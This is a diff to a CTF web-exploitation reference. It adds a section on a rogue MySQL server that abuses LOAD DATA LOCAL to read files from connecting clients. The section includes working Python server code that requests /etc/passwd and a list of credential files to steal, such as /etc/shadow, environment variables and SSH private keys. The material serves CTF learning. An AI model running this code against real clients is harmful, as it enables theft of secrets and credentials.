@@ -16,6 +16,7 @@
 - [SSRF via parse_url/curl URL Parsing Discrepancy (33C3 CTF 2016)](#ssrf-via-parse_urlcurl-url-parsing-discrepancy-33c3-ctf-2016)
 - [LaTeX RCE via mpost Restricted write18 Bypass (33C3 CTF 2016)](#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016)
 - [ElasticSearch Groovy script_fields RCE via SSRF (VolgaCTF 2017)](#elasticsearch-groovy-script_fields-rce-via-ssrf-volgactf-2017)
+- [Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)](#rogue-mysql-server-load-data-local-file-read-volgactf-2018)
 
 See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses, Flask/Werkzeug debug, XXE external DTD, WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, React Server Components Flight RCE).
 
@@ -487,3 +488,72 @@ print(r.text)
 **Detection:** SSRF vulnerability + internal service on port 9200. Confirm with `http://localhost:9200/` (returns ES version info) or `http://localhost:9200/_cat/indices` (lists indices).
 
 **Key insight:** ElasticSearch pre-5.0 exposed Groovy scripting via the `_search` API. Even without direct access, SSRF to port 9200 enables full RCE through `script_fields`. Modern ES versions disabled inline scripting by default. When testing SSRF, always probe port 9200 -- ElasticSearch is a common internal service with powerful script execution capabilities.
+
+---
+
+### Rogue MySQL Server LOAD DATA LOCAL File Read (VolgaCTF 2018)
+
+**Pattern:** When a service connects to your controlled MySQL server with `LOAD DATA LOCAL` enabled, send a rogue response requesting arbitrary file reads from the client machine. The MySQL protocol allows the server to request the client to send any local file during the `LOAD DATA LOCAL INFILE` handshake, regardless of what query the client intended to execute.
+
+**How it works:**
+1. Victim application connects to attacker-controlled MySQL server (e.g., via SSRF or misconfigured DB host)
+2. Attacker server completes the handshake normally
+3. When the client sends any query, the rogue server responds with a file transfer request packet
+4. The client reads the requested local file and sends its contents to the server
+
+```python
+# Rogue MySQL server — simplified core logic
+import socket
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('0.0.0.0', 3306))
+server.listen(1)
+conn, addr = server.accept()
+
+# Send server greeting (MySQL handshake)
+greeting = bytes.fromhex(
+    '4a0000000a352e362e32382d'  # version 5.6.28
+    '307562756e747530'          # ubuntu0
+    '2e31342e30342e31'          # .14.04.1
+    '001d000000'                # connection id
+    '2a5e2a683e6a2b29'          # auth plugin data part 1
+    '00fff70800'                # capability flags
+    '210000000000000000000000'  # more fields
+    '00'
+    '282a4e3b3a592635254a2944'  # auth plugin data part 2
+    '00'
+)
+conn.send(greeting)
+
+# Receive client auth response
+conn.recv(4096)
+
+# Send OK packet (auth success)
+conn.send(bytes.fromhex('0700000200000002000000'))
+
+# Wait for client to send a query
+conn.recv(4096)
+
+# Check client capability bit "Can Use LOAD DATA LOCAL: Set"
+# Send rogue file read request for /etc/passwd
+dump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')
+conn.send(dump_etc_passwd)  # rogue MySQL file read request
+
+# Receive file contents from client
+file_data = conn.recv(65535)
+print(f"[+] Received file contents:\n{file_data.decode(errors='replace')}")
+
+conn.close()
+```
+
+**Useful files to request:**
+```text
+/etc/passwd                    # User enumeration
+/etc/shadow                    # Password hashes (if client runs as root)
+/proc/self/environ             # Environment variables with secrets
+/var/www/html/config.php       # Application config with DB credentials
+/home/user/.ssh/id_rsa         # SSH private keys
+/flag.txt                      # CTF flag
+```
+
+**Key insight:** A rogue MySQL server can request the connecting client to send any local file via the LOAD DATA LOCAL protocol, regardless of what query the client intended to execute. This works because the MySQL protocol allows the server to respond to any client query with a file transfer request. Look for challenges where you can control the MySQL host a service connects to (SSRF, config injection, DNS rebinding). The client must have `LOAD DATA LOCAL` enabled (default in many MySQL client libraries).
